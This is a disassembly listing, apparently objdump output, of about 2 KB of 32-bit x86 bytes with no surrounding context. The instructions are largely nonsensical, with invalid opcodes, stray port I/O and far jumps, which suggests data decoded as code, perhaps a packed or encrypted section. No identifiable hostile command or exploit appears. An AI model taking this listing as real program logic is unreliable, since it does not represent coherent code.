  41286f:	adc    cl,bl
  412871:	mov    bl,0xf8
  412873:	mov    bl,0x83
  412875:	pop    ebp
  412876:	push   0xffffff8e
  412878:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412879:	jge    0x412870
  41287b:	mov    dl,0x94
  41287d:	or     DWORD PTR ds:0xed39d281,esi
  412883:	or     BYTE PTR [edi-0x25],ch
  412886:	dec    esp
  412887:	push   cs
  412888:	ja     0x412880
  41288a:	jb     0x412905
  41288c:	jecxz  0x412886
  41288e:	adc    ah,BYTE PTR [edi+ebx*4+0x6c521474]
  412895:	push   0x64486c47
  41289a:	pop    ds
  41289b:	or     eax,0xa8e85e98
  4128a0:	call   0xd982fc42
  4128a5:	push   edi
  4128a6:	out    dx,eax
  4128a7:	repnz (bad) 
  4128a9:	cli    
  4128aa:	retf   0x4065
  4128ad:	jge    0x412914
  4128af:	adc    DWORD PTR [esi-0x4c],edx
  4128b2:	aam    0xe0
  4128b4:	and    eax,edx
  4128b6:	pop    edi
  4128b7:	adc    BYTE PTR [ebp-0x19],al
  4128ba:	mov    ah,0x55
  4128bc:	inc    esp
  4128bd:	pop    esp
  4128be:	inc    esp
  4128bf:	aas    
  4128c0:	mov    edi,0x90b2d89
  4128c5:	lods   eax,DWORD PTR ds:[esi]
  4128c6:	adc    eax,0x54b96cab
  4128cb:	sub    ch,BYTE PTR [esi+0x7b14683d]
  4128d1:	fimul  DWORD PTR [ebx+0x2b5ae8d]
  4128d7:	dec    ebx
  4128d8:	dec    edx
  4128d9:	int    0x21
  4128db:	in     al,dx
  4128dc:	push   ebx
  4128dd:	mov    dh,ah
  4128df:	loop   0x41289c
  4128e1:	push   cs
  4128e2:	xchg   DWORD PTR [ebx+esi*8],edi
  4128e5:	nop
  4128e6:	out    0xdb,eax
  4128e8:	jl     0x41295d
  4128ea:	gs ja  0x41289c
  4128ed:	adc    BYTE PTR [ebx],dl
  4128ef:	adc    edx,DWORD PTR [ecx+0x68]
  4128f2:	rcl    BYTE PTR [ebx+0x3b],cl
  4128f5:	or     eax,0x4f23db0a
  4128fa:	cmp    BYTE PTR ds:[ecx+0x4183e239],al
  412901:	push   ds
  412902:	mov    edi,0x2b8d7853
  412907:	cld    
  412908:	js     0x4128d8
  41290a:	and    dh,BYTE PTR [ebp+0x159e920d]
  412910:	in     eax,dx
  412911:	gs fwait
  412913:	lea    ebp,[ecx+0x33]
  412916:	dec    eax
  412917:	or     eax,0x4b506da9
  41291c:	cmp    ebp,DWORD PTR [eax-0x477e00f7]
  412922:	mov    bl,0xa6
  412924:	jo     0x4128fa
  412926:	sub    BYTE PTR [ebp+0x3b],bh
  412929:	pop    ecx
  41292a:	mov    esp,0x6e0c353
  41292f:	xor    dl,BYTE PTR [edi]
  412931:	mov    BYTE PTR [ecx+eiz*8+0x2e],dh
  412935:	or     DWORD PTR [edi],esi
  412937:	push   ds
  412938:	fld    DWORD PTR [edx+ebx*8+0x1b0fa982]
  41293f:	jmp    0x76b247a8
  412944:	adc    al,0xd6
  412946:	inc    esp
  412947:	(bad)  
  412948:	xchg   esi,eax
  412949:	mov    ah,0x43
  41294b:	ins    BYTE PTR es:[edi],dx
  41294c:	and    ecx,0x4f
  41294f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412950:	xor    ah,bh
  412952:	dec    edx
  412953:	loope  0x412992
  412955:	mov    bl,0x3
  412957:	jge    0x4129cc
  412959:	sbb    al,0x10
  41295b:	test   BYTE PTR [edi+0x12],cl
  41295e:	and    dl,cl
  412960:	add    dl,BYTE PTR [ebx+0x79e19f5b]
  412966:	in     al,0x6d
  412968:	xchg   esi,eax
  412969:	jge    0x4129d6
  41296b:	ss mov al,0x2f
  41296e:	dec    ecx
  41296f:	pushf  
  412970:	cmp    BYTE PTR [edx+0x366ee7df],al
  412976:	stos   DWORD PTR es:[edi],eax
  412977:	not    DWORD PTR [ebx-0x675eb6cb]
  41297d:	into   
  41297e:	aaa    
  41297f:	and    ebx,eax
  412981:	repnz cdq 
  412983:	in     al,0xef
  412985:	xchg   edi,eax
  412986:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412987:	mov    al,ds:0x14d2e846
  41298c:	adc    dl,BYTE PTR [edi]
  41298e:	add    DWORD PTR [esi],edi
  412990:	(bad)  
  412991:	les    esi,FWORD PTR [ebp-0x1a12d515]
  412997:	jnp    0x412971
  412999:	mov    bl,0x75
  41299b:	push   ss
  41299c:	jge    0x4129a6
  41299e:	xchg   edx,eax
  41299f:	and    ebx,0xe54b4391
  4129a5:	mov    ds:0xa0a976e4,al
  4129aa:	or     bh,BYTE PTR [edi+0x22]
  4129ad:	push   eax
  4129ae:	shl    DWORD PTR [edx+0x5580bd71],cl
  4129b4:	mov    al,0x20
  4129b6:	cmp    al,0x16
  4129b8:	push   ebp
  4129b9:	lea    ebx,ds:0x69d21542
  4129c0:	sahf   
  4129c1:	out    dx,al
  4129c2:	push   0xb38df0f1
  4129c7:	add    ah,BYTE PTR [eax]
  4129c9:	cs sub eax,0x91fe0be5
  4129cf:	jo     0x4129fa
  4129d1:	cdq    
  4129d2:	push   eax
  4129d3:	nop
  4129d4:	retf   0x243d
  4129d7:	dec    ecx
  4129d8:	cmc    
  4129d9:	sbb    edi,esp
  4129db:	cmc    
  4129dc:	clc    
  4129dd:	sar    bh,1
  4129df:	test   al,0x74
  4129e1:	pop    edi
  4129e2:	repnz push ecx
  4129e4:	inc    ecx
  4129e5:	shl    BYTE PTR [edx-0xe],1
  4129e8:	cdq    
  4129e9:	adc    BYTE PTR [esi],dh
  4129eb:	daa    
  4129ec:	js     0x4129a7
  4129ee:	push   eax
  4129ef:	mov    ds:0x52974483,al
  4129f4:	xchg   ecx,eax
  4129f5:	pusha  
  4129f6:	sub    ebp,DWORD PTR [ebx]
  4129f8:	ja     0x41297f
  4129fa:	push   esp
  4129fb:	jae    0x412a6b
  4129fd:	and    ebx,DWORD PTR [edx-0x7750aa18]
  412a03:	push   edx
  412a04:	test   al,0x2b
  412a06:	stc    
  412a07:	popf   
  412a08:	stos   BYTE PTR es:[edi],al
  412a09:	ds push ss
  412a0b:	pop    ds
  412a0c:	inc    esi
  412a0d:	or     al,0x3c
  412a0f:	pop    ebp
  412a10:	dec    edx
  412a11:	sub    ch,BYTE PTR [ecx+0x42]
  412a14:	in     eax,dx
  412a15:	sub    ecx,esi
  412a17:	dec    edi
  412a18:	dec    edx
  412a19:	mov    ds:0x171c910,eax
  412a1e:	retf   
  412a1f:	cmp    al,dl
  412a21:	inc    eax
  412a22:	add    edi,DWORD PTR [ebp-0x72b9c0b9]
  412a28:	fisttp DWORD PTR [ecx-0x56063ccf]
  412a2e:	mov    cl,0xf1
  412a30:	pop    edx
  412a31:	pop    ds
  412a32:	xchg   esi,eax
  412a33:	or     ch,ch
  412a35:	cwde   
  412a36:	and    esp,DWORD PTR gs:[esi+0x1170eabd]
  412a3d:	mov    ebp,0x9f1c9698
  412a42:	ret    
  412a43:	mov    ds:0xe56c1138,eax
  412a48:	daa    
  412a49:	cwde   
  412a4a:	pop    ecx
  412a4b:	test   al,0xfb
  412a4d:	into   
  412a4e:	ins    BYTE PTR es:[edi],dx
  412a4f:	dec    esp
  412a50:	jb     0x412a9f
  412a52:	in     al,0xe8
  412a54:	fs and eax,0xa30fdfbb
  412a5a:	push   esp
  412a5b:	adc    DWORD PTR [edi-0xee8113e],ebp
  412a61:	dec    edx
  412a62:	je     0x4129ea
  412a64:	ss out dx,al
  412a66:	mov    WORD PTR [ebp-0x21b1cbd0],gs
  412a6c:	call   0x356a:0x2a335f41
  412a73:	xor    bl,BYTE PTR [edi]
  412a75:	into   
  412a76:	jl     0x412aa0
  412a78:	mov    al,0x93
  412a7a:	out    0x66,eax
  412a7c:	retf   0x2c12
  412a7f:	icebp  
  412a80:	les    esp,FWORD PTR cs:[ebx-0x49bee489]
  412a87:	and    DWORD PTR [edi],edx
  412a89:	call   0x90c938cd
  412a8e:	ss cmp DWORD PTR ds:[ebx],edi
  412a92:	and    eax,0xb6a5997d
  412a97:	les    eax,FWORD PTR [ecx]
  412a99:	call   0x72b83749
  412a9e:	inc    eax
  412a9f:	xlat   BYTE PTR ds:[ebx]
  412aa0:	pop    esp
  412aa1:	mov    ch,0xef
  412aa3:	add    eax,0xdfd90209
  412aa8:	xchg   ecx,eax
  412aa9:	adc    eax,DWORD PTR [ebx-0x1547fe38]
  412aaf:	or     bl,BYTE PTR [ebx]
  412ab1:	or     eax,0x7c6d4c87
  412ab6:	ss push esi
  412ab8:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  412aba:	pop    es
  412abb:	lea    eax,[esi-0xec02a4d]
  412ac1:	sub    eax,0xc6337122
  412ac6:	(bad)  
  412ac7:	in     al,0x76
  412ac9:	imul   ebp,DWORD PTR ds:0x6458a60,0xffffffef
  412ad0:	sub    edx,DWORD PTR [ecx]
  412ad2:	jne    0x412b08
  412ad4:	adc    eax,0x5a55dbab
  412ad9:	adc    ah,BYTE PTR [edx+0x118d610b]
  412adf:	cli    
  412ae0:	(bad)  
  412ae1:	cld    
  412ae2:	lods   eax,DWORD PTR ds:[esi]
  412ae3:	mov    ebp,0xb22bc12a
  412ae8:	bound  esi,QWORD PTR [eax-0x67]
  412aeb:	es cdq 
  412aed:	fs jae 0x412a85
  412af0:	mov    ?,WORD PTR [eax-0x1]
  412af3:	shl    BYTE PTR [edi+0x6c],cl
  412af6:	mov    dl,0x4f
  412af8:	repz (bad) 
  412afa:	xor    BYTE PTR [ecx-0x56],dh
  412afd:	stc    
  412afe:	push   ecx
  412aff:	(bad)  
  412b00:	rcl    BYTE PTR [ebp-0x24],0x50
  412b04:	jg     0x412b83
  412b06:	aad    0x4c
  412b08:	cdq    
  412b09:	mov    al,0xc9
  412b0b:	ja     0x412aef
  412b0d:	mov    eax,0x6b0faa7e
  412b12:	mov    ebp,0x1a2e69c6
  412b17:	int    0x77
  412b19:	cmp    esi,edi
  412b1b:	into   
  412b1c:	sbb    cl,0xc0
  412b1f:	or     BYTE PTR [eax],0xb7
  412b22:	pop    eax
  412b23:	or     ecx,DWORD PTR [ebp-0x3b3c6c52]
  412b29:	aad    0x8a
  412b2b:	pop    ss
  412b2c:	sub    eax,0x6665a20b
  412b31:	ss mov ebx,0xe02af742
  412b37:	out    0xf5,eax
  412b39:	fwait
  412b3a:	mov    eax,0x7dce6958
  412b40:	xchg   BYTE PTR [ebx-0x2e50f05e],bh
  412b46:	xor    eax,0x509775fe
  412b4b:	loop   0x412ba8
  412b4d:	pop    ss
  412b4e:	fcmove st,st(5)
  412b50:	sbb    al,0xf5
  412b52:	ins    DWORD PTR es:[edi],dx
  412b53:	imul   cl
  412b55:	cmp    BYTE PTR [esi-0x454334af],ch
  412b5b:	mov    ch,0xcd
  412b5d:	pop    ss
  412b5e:	fucomp st(0)
  412b60:	(bad)  
  412b61:	jp     0x412b95
  412b63:	popa   
  412b64:	fdiv   DWORD PTR [edi+ebx*2]
  412b68:	mov    DWORD PTR [esi],esi
  412b6a:	sub    edi,DWORD PTR [eax]
  412b6c:	push   cs
  412b6d:	rol    DWORD PTR [eax],cl
  412b6f:	sub    eax,0x384e1da9
  412b74:	pop    esi
  412b75:	iret   
  412b76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b77:	jnp    0x412b88
  412b79:	into   
  412b7a:	fucom  st(6)
  412b7c:	jp     0x412b0e
  412b7e:	mov    bh,0xbe
  412b80:	xor    esi,DWORD PTR [edi-0x67]
  412b83:	or     ecx,DWORD PTR [ebx-0x45]
  412b86:	popf   
  412b87:	add    al,0xd7
  412b89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b8a:	inc    esi
  412b8b:	fst    QWORD PTR [edx]
  412b8d:	cmp    eax,0x9e498053
  412b92:	push   0xd27ff20a
  412b97:	cdq    
  412b98:	inc    ecx
  412b99:	jle    0x412bfd
  412b9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b9d:	sbb    ecx,DWORD PTR [edi+0x478b7569]
  412ba3:	dec    ebp
  412ba4:	(bad)  [edx]
  412ba6:	ret    0xd288
  412ba9:	push   cs
  412baa:	mov    dl,0xf9
  412bac:	call   0x915c:0xc983b6c2
  412bb3:	inc    ebp
  412bb4:	xchg   ecx,eax
  412bb5:	lock std 
  412bb7:	mov    BYTE PTR [ebx-0x5d0c2639],bh
  412bbd:	adc    eax,0xc00b1215
  412bc2:	and    edi,esi
  412bc4:	test   bh,0x8c
  412bc7:	shr    BYTE PTR [ecx-0x74053a36],0xa3
  412bce:	inc    DWORD PTR [ecx+edi*8+0x59]
  412bd2:	xor    BYTE PTR [ebp-0x2],0x13
  412bd6:	arpl   WORD PTR [edx-0x18],bp
  412bd9:	mov    ebx,DWORD PTR [ebx+ecx*4]
  412bdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bdd:	shl    BYTE PTR [edx+0x43],1
  412be0:	aad    0x4c
  412be2:	sahf   
  412be3:	clc    
  412be4:	push   edi
  412be5:	hlt    
  412be6:	sub    DWORD PTR [esi+esi*1-0x42],edi
  412bea:	(bad)  
  412beb:	shr    ch,1
  412bed:	test   BYTE PTR [edx+0x45],al
  412bf0:	fld    TBYTE PTR [bx+si+0x55]
  412bf4:	push   es
  412bf5:	std    
  412bf6:	sub    bl,BYTE PTR [eax-0x46f0dc0b]
  412bfc:	repz mov edi,0xafbae39c
  412c02:	jns    0x412c57
  412c04:	xor    bh,BYTE PTR [esi-0x5f78b5da]
  412c0a:	mov    DWORD PTR [ecx],0xe128e091
  412c10:	inc    ebx
  412c11:	add    dh,BYTE PTR [ecx-0xea3aba3]
  412c17:	push   0x27
  412c19:	jp     0x412c38
  412c1b:	and    bh,BYTE PTR [ebx]
  412c1d:	inc    ecx
  412c1e:	inc    ebp
  412c1f:	lds    ebp,FWORD PTR es:[ebp-0x37278896]
  412c26:	adc    eax,0x9b0b487e
  412c2b:	push   ecx
  412c2c:	dec    ebp
  412c2d:	into   
  412c2e:	idiv   DWORD PTR [ebp-0x345ec784]
  412c34:	sub    BYTE PTR [esi-0x2b],cl
  412c37:	into   
  412c38:	xor    edx,DWORD PTR [esi+ecx*4-0x77]
  412c3c:	ficomp WORD PTR [ebp-0x20f921ad]
  412c42:	imul   esi,DWORD PTR [edi+0x2032b7d6],0xa90a14f4
  412c4c:	test   al,0x2d
  412c4e:	push   edx
  412c4f:	jle    0x412c58
  412c51:	xor    DWORD PTR [ebx-0x1],ebx
  412c54:	xchg   esp,eax
  412c55:	add    DWORD PTR [eax-0x6a],ebp
  412c58:	pop    edx
  412c59:	imul   eax,DWORD PTR [ebx-0x4],0xc87ccae8
  412c60:	xor    edi,DWORD PTR [edx-0x2a]
  412c63:	inc    edi
  412c64:	cld    
  412c65:	pop    es
  412c66:	jne    0x412c43
  412c68:	das    
  412c69:	call   0xcb04:0xd0f0b282
  412c70:	and    ebp,DWORD PTR [edi-0x32d7df53]
  412c76:	dec    esi
  412c77:	xor    eax,0xd8b61ef8
  412c7c:	jle    0x412c68
  412c7e:	fmul   QWORD PTR [edi+0x69]
  412c81:	sbb    esp,0x20
  412c84:	ds pop ecx
  412c86:	sti    
  412c87:	pop    ebp
  412c88:	test   DWORD PTR [esi+0x1de3090c],ebx
  412c8e:	fild   WORD PTR [bp+si-0x44]
  412c92:	dec    esp
  412c93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c94:	mov    ch,0xd6
  412c96:	mov    dh,0xdd
  412c98:	cmp    DWORD PTR [edx+0xf],esp
  412c9b:	or     DWORD PTR [ebp+0xfd33264],ebp
  412ca1:	aam    0x26
  412ca3:	pop    ebx
  412ca4:	jnp    0x412c58
  412ca6:	enter  0xca5c,0xdf
  412caa:	pop    es
  412cab:	imul   ecx,DWORD PTR [ecx],0xa3cd8073
  412cb1:	std    
  412cb2:	stos   DWORD PTR es:[edi],eax
  412cb3:	and    BYTE PTR [edi-0x40],bh
  412cb6:	popa   
  412cb7:	adc    BYTE PTR [eax+0x72949de9],0x6c
  412cbe:	les    ebx,FWORD PTR [edx]
  412cc0:	jmp    0x412c99
  412cc2:	add    BYTE PTR [edx],ch
  412cc4:	jge    0x412d02
  412cc6:	jp     0x412c81
  412cc8:	scas   eax,DWORD PTR es:[edi]
  412cc9:	(bad)  
  412cca:	fidiv  WORD PTR [eax-0x50]
  412ccd:	sbb    eax,0x3dacba14
  412cd2:	xchg   bh,bh
  412cd4:	xchg   edi,eax
  412cd5:	clc    
  412cd6:	mov    BYTE PTR [edi+0x1362b15a],ah
  412cdc:	das    
  412cdd:	imul   eax,DWORD PTR [edx-0x76],0x1960e5f1
  412ce4:	fsubr  st(1),st
  412ce6:	sub    esi,DWORD PTR [ebx-0x51]
  412ce9:	test   al,0x0
  412ceb:	(bad)  
  412cec:	push   0x51
  412cee:	jo     0x412d35
  412cf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412cf1:	daa    
  412cf2:	(bad)  
  412cf4:	int    0x86
  412cf6:	jae    0x412cd6
  412cf8:	push   esi
  412cf9:	sbb    DWORD PTR [ecx-0x541ee85],ebx
  412cff:	add    DWORD PTR [edi-0x199adf3d],ecx
  412d05:	jmp    0x412d3f
  412d07:	iret   
  412d08:	cmp    dh,BYTE PTR [ebp-0x32]
  412d0b:	inc    ecx
  412d0c:	out    0x3b,al
  412d0e:	pop    ebx
  412d0f:	test   eax,0x7eaa47b5
  412d14:	mov    edx,0x9c20f985
  412d19:	mov    dl,0xf3
  412d1b:	loopne 0x412cc9
  412d1d:	xor    DWORD PTR [ebx+0x7a],0x5e
  412d21:	pop    ds
  412d22:	repz call 0x697c6757
  412d28:	inc    ecx
  412d29:	out    dx,al
  412d2a:	pop    es
  412d2b:	(bad)  
  412d2c:	shr    dh,1
  412d2e:	pop    ecx
  412d2f:	ret    0x43e5
  412d32:	ffree  st(2)
  412d34:	xchg   ebx,eax
  412d35:	inc    edi
  412d36:	pusha  
  412d37:	das    
  412d38:	add    BYTE PTR [ecx+ecx*4+0x6d],0xeb
  412d3d:	xor    al,0x44
  412d3f:	outs   dx,BYTE PTR ds:[esi]
  412d40:	and    cl,bh
  412d42:	test   al,0xd6
  412d44:	jg     0x412dad
  412d46:	test   ecx,esi
  412d48:	int    0x2
  412d4a:	ret    
  412d4b:	sbb    eax,0x72a27926
  412d50:	(bad)  
  412d51:	fadd   st(6),st
  412d53:	mov    fs,WORD PTR [ecx+0x36]
  412d56:	loop   0x412d18
  412d58:	pop    ecx
  412d59:	push   esi
  412d5a:	das    
  412d5b:	mov    dl,0x43
  412d5d:	mov    eax,0x3bd4a67a
  412d62:	ret    
  412d63:	call   0x887491ab
  412d68:	xchg   BYTE PTR [edi],bh
  412d6a:	jp     0x412d07
  412d6c:	lock add DWORD PTR [esi+0x15],ecx
  412d70:	daa    
  412d71:	add    ebx,ecx
  412d73:	imul   esp,esp,0x60d2aab5
  412d79:	lahf   
  412d7a:	pop    edi
  412d7b:	sub    ebp,edi
  412d7d:	push   es
  412d7e:	mov    eax,0x4e7c2926
  412d83:	test   eax,0xd50c9237
  412d88:	stos   BYTE PTR es:[edi],al
  412d89:	lahf   
  412d8a:	in     al,0x76
  412d8c:	pop    esi
  412d8d:	add    dh,al
  412d8f:	sub    esp,DWORD PTR [ecx+0x38076db]
  412d95:	das    
  412d96:	cmp    ebp,DWORD PTR [ebp+ebp*4+0x480908eb]
  412d9d:	jno    0x412dca
  412d9f:	cli    
  412da0:	std    
  412da1:	jnp    0x412dd0
  412da3:	jae    0x412db5
  412da5:	mov    BYTE PTR [edx],dh
  412da7:	pop    esp
  412da8:	stc    
  412da9:	pop    es
  412daa:	pop    ebx
  412dab:	hlt    
  412dac:	shl    ah,1
  412dae:	out    0x73,eax
  412db0:	sbb    esi,edx
  412db2:	push   esp
  412db3:	xbegin 0xa1e6474e
  412db9:	call   0x71:0xa47e7ebc
  412dc0:	xchg   esi,eax
  412dc1:	fs pop esi
  412dc3:	inc    ecx
  412dc4:	pusha  
  412dc5:	mov    dl,0x6c
  412dc7:	cmp    dh,ch
  412dc9:	or     ebx,esi
  412dcb:	(bad)  
  412dcc:	lock cmp al,BYTE PTR ds:0x9cf38a91
  412dd3:	adc    BYTE PTR [esi+0x3a],bl
  412dd6:	jnp    0x412d95
  412dd8:	outs   dx,BYTE PTR ds:[esi]
  412dd9:	xchg   ebp,eax
  412dda:	hlt    
  412ddb:	loopne 0x412dee
  412ddd:	adc    ebx,ebp
  412ddf:	sbb    bl,BYTE PTR [ebp-0x622eaa99]
  412de5:	and    eax,0xf559c71b
  412dea:	aas    
  412deb:	xor    eax,0x2c7a34ee
  412df0:	div    BYTE PTR [edi+0x5b]
  412df3:	mov    bl,BYTE PTR [esi-0x14]
  412df6:	test   bh,bl
  412df8:	repnz dec ecx
  412dfa:	hlt    
  412dfb:	sub    eax,0x715775d7
  412e00:	pop    esp
  412e01:	sub    al,0xec
  412e03:	inc    edi
  412e04:	rcl    BYTE PTR [eax],1
  412e06:	out    dx,al
  412e07:	sbb    al,0x6e
  412e09:	cli    
  412e0a:	mov    edi,0x40ad860
  412e0f:	lods   eax,DWORD PTR ds:[esi]
  412e10:	inc    ebp
  412e11:	pop    ds
  412e12:	enter  0x48e1,0x21
  412e16:	loop   0x412e07
  412e18:	fsubr  QWORD PTR [eax-0x5ef23d51]
  412e1e:	jg     0x1617
  412e23:	xor    DWORD PTR [edx],0x31
  412e26:	data16 sub al,0x9a
  412e29:	je     0x412dee
  412e2b:	rcr    DWORD PTR [eiz*8+0x19b9a9dc],1
  412e32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e33:	ret    
  412e34:	les    esp,FWORD PTR [ecx-0x4f]
  412e37:	shr    BYTE PTR [eax+0x7fa2e389],0xb5
  412e3e:	leave  
  412e3f:	pop    ebp
  412e40:	lds    ebp,FWORD PTR [eax]
  412e42:	mov    ch,0x46
  412e44:	pushf  
  412e45:	inc    edx
  412e46:	pushf  
  412e47:	pop    ecx
  412e48:	fdiv   DWORD PTR [ebx]
  412e4a:	jae    0x412e77
  412e4c:	scas   al,BYTE PTR es:[edi]
  412e4d:	jne    0x412e83
  412e4f:	les    esp,FWORD PTR ds:0xc4b87617
  412e55:	loopne 0x412e96
  412e57:	and    al,0x16
  412e59:	fwait
  412e5a:	jns    0x412eaf
  412e5c:	popa   
  412e5d:	jecxz  0x412eb0
  412e5f:	adc    al,0xc3
  412e61:	call   0x3815:0xba9937aa
  412e68:	test   edx,esi
  412e6a:	mov    al,0xa8
  412e6c:	lods   eax,DWORD PTR ds:[esi]
  412e6d:	popf   
  412e6e:	clc    
  412e6f:	or     BYTE PTR [eax+0x781cd2d2],0xcd
  412e76:	scas   eax,DWORD PTR es:[edi]
  412e77:	mov    ecx,0x4faf6cd7
  412e7c:	xchg   DWORD PTR [edx-0x443794b6],edi
  412e82:	pop    edi
  412e83:	in     al,dx
  412e84:	push   0xdca016a3
  412e89:	adc    eax,esp
  412e8b:	fs mov bl,cl
  412e8e:	mov    eax,0x7eea1bc4
  412e93:	inc    ebp
  412e94:	aaa    
  412e95:	(bad)  
  412e96:	into   
  412e97:	push   ecx
  412e98:	sbb    ah,BYTE PTR [ecx]
  412e9a:	cdq    
  412e9b:	jb     0x412e92
  412e9d:	mov    cs,esp
  412e9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ea0:	ins    BYTE PTR es:[edi],dx
  412ea1:	pop    ebp
  412ea2:	push   0x6a
  412ea4:	mov    esi,0x27758a8b
  412ea9:	in     al,dx
  412eaa:	out    0x2c,eax
  412eac:	push   eax
  412ead:	lock sub bl,BYTE PTR gs:[edx+0x17b30c55]
  412eb5:	inc    esp
  412eb6:	push   ss
  412eb7:	adc    dl,BYTE PTR [ebx+0x52]
  412eba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ebb:	das    
  412ebc:	(bad)  
  412ebd:	hlt    
  412ebe:	dec    edi
  412ebf:	addr16 pop ds
  412ec1:	mov    ch,0xbc
  412ec3:	jecxz  0x412e99
  412ec5:	dec    ebx
  412ec6:	cli    
  412ec7:	mov    ch,0x33
  412ec9:	popf   
  412eca:	test   eax,0x4fdfba00
  412ecf:	dec    ebx
  412ed0:	inc    edi
  412ed1:	mov    al,0x78
  412ed3:	scas   al,BYTE PTR es:[edi]
  412ed4:	mov    esp,0x67dbbf92
  412ed9:	inc    ebx
  412eda:	inc    ebp
  412edb:	add    eax,0xf017cdd3
  412ee0:	leave  
  412ee1:	or     DWORD PTR [ebx-0x4d],esi
  412ee4:	in     al,dx
  412ee5:	shr    BYTE PTR [eax-0x18838be0],1
  412eeb:	shl    dl,cl
  412eed:	je     0x412f26
  412eef:	out    0x39,eax
  412ef1:	mov    eax,0x68c7dded
  412ef6:	shl    BYTE PTR [ebx+ecx*8+0x43],cl
  412efa:	mov    edi,DWORD PTR [ecx+0x3b8ad4a5]
  412f00:	ja     0x412eaf
  412f02:	jmp    0x2e26:0x441f3042
  412f09:	cli    
  412f0a:	cmp    DWORD PTR [eax],0x1f
  412f0d:	adc    bh,BYTE PTR ds:0x3c38f21f
  412f13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f14:	and    bl,BYTE PTR [ecx+0x3c]
  412f17:	or     DWORD PTR [ecx-0x48],eax
  412f1a:	mov    dl,0x6f
  412f1c:	icebp  
  412f1d:	jno    0x412ea7
  412f1f:	dec    ebx
  412f20:	push   0x1d
  412f22:	cld    
  412f23:	push   ds
  412f24:	jp     0x412f74
  412f26:	xchg   ebp,eax
  412f27:	and    al,al
  412f29:	push   esi
  412f2a:	je     0x412f8c
  412f2c:	ds fcmovnu st,st(5)
  412f2f:	addr16 sbb al,0xe5
  412f32:	inc    eax
  412f33:	push   edx
  412f34:	add    edx,DWORD PTR [ebx]
  412f36:	stc    
  412f37:	xchg   DWORD PTR [edx+ecx*4],ebx
  412f3a:	inc    ebp
  412f3b:	adc    BYTE PTR [eax+ebp*4],dh
  412f3e:	adc    BYTE PTR [esi],ah
  412f40:	out    0x48,al
  412f42:	adc    DWORD PTR [ebx-0x5e],ebx
  412f45:	jbe    0x412f0a
  412f47:	popa   
  412f48:	jnp    0x412f74
  412f4a:	loopne 0x412fba
  412f4c:	xchg   ebp,eax
  412f4d:	idiv   BYTE PTR [eax]
  412f4f:	fisttp QWORD PTR [eax]
  412f51:	out    0xd6,eax
  412f53:	push   ebx
  412f54:	sbb    dh,BYTE PTR [edx+0x5e]
  412f57:	mov    ch,0x2e
  412f59:	jno    0x412f36
  412f5b:	ins    DWORD PTR es:[edi],dx
  412f5c:	add    al,0x4c
  412f5e:	loopne 0x412f99
  412f60:	sbb    DWORD PTR [eax-0x181a7012],ecx
  412f66:	xor    al,0x5b
  412f68:	add    ch,dh
  412f6a:	ror    DWORD PTR [esi-0x6b],cl
  412f6d:	and    edi,DWORD PTR [edx-0x37e952d9]
  412f73:	bound  edx,QWORD PTR [eax+eiz*1+0x4f]
  412f77:	pop    edx
  412f78:	xor    cl,dh
  412f7a:	push   ebp
  412f7b:	test   al,0x80
  412f7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f7e:	mov    bh,al
  412f80:	lea    esi,[ecx-0x4f]
  412f83:	xchg   ebx,eax
  412f84:	push   es
  412f85:	pop    ss
  412f86:	daa    
  412f87:	inc    edx
  412f88:	push   edx
  412f89:	adc    DWORD PTR [eax],ecx
  412f8b:	and    ah,ch
  412f8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f8e:	bound  esp,QWORD PTR [esi-0x1d]
  412f91:	sbb    ah,BYTE PTR [edx-0x740ef379]
  412f97:	popf   
  412f98:	sbb    al,0xd4
  412f9a:	rcl    DWORD PTR [edx+0x40],0x60
  412f9e:	cmp    al,0x7d
  412fa0:	ins    DWORD PTR es:[edi],dx
  412fa1:	out    0x99,al
  412fa3:	jb     0x412faa
  412fa5:	inc    ecx
  412fa6:	jno    0x412f63
  412fa8:	stos   BYTE PTR es:[edi],al
  412fa9:	dec    ebx
  412faa:	sbb    edi,ecx
  412fac:	std    
  412fad:	sub    edx,DWORD PTR [edi]
  412faf:	mov    cl,0xc0
  412fb1:	(bad)  
  412fb2:	int    0x5d
  412fb4:	mov    BYTE PTR [esi-0x2f],al
  412fb7:	jo     0x412fed
  412fb9:	sbb    eax,0x32cda3f1
  412fbe:	jmp    FWORD PTR [edi-0x4d86c87e]
  412fc4:	push   es
  412fc5:	xor    BYTE PTR [ebx+0x6f],0x54
  412fc9:	xchg   esi,eax
  412fca:	cmp    al,0x2c
  412fcc:	in     al,0x44
  412fce:	idiv   BYTE PTR [esp+esi*2+0x1b]
  412fd2:	gs ja  0x412ffb
  412fd5:	retf   
  412fd6:	push   esp
  412fd7:	push   ecx
  412fd8:	jae    0x413015
  412fda:	sub    BYTE PTR [esi-0xe],ch
  412fdd:	pop    ebx
  412fde:	sar    BYTE PTR [esi+0x7ec2adfd],cl
  412fe4:	jmp    0x413055
  412fe6:	outs   dx,DWORD PTR fs:[esi]
  412fe8:	adc    bl,BYTE PTR [ebx+0x6e]
  412feb:	and    esi,DWORD PTR [edi]
  412fed:	lock xchg edx,eax
  412fef:	inc    ecx
  412ff0:	xor    DWORD PTR [edx+ebp*1+0x27],edi
  412ff4:	and    ah,bh
  412ff6:	enter  0xd69f,0xa5
  412ffa:	cwde   
  412ffb:	ret    0x97e
  412ffe:	out    dx,al
  412fff:	sub    bl,ah
  413001:	jg     0x412fba
  413003:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413004:	dec    edx
  413005:	test   cl,0xec
  413008:	(bad)  
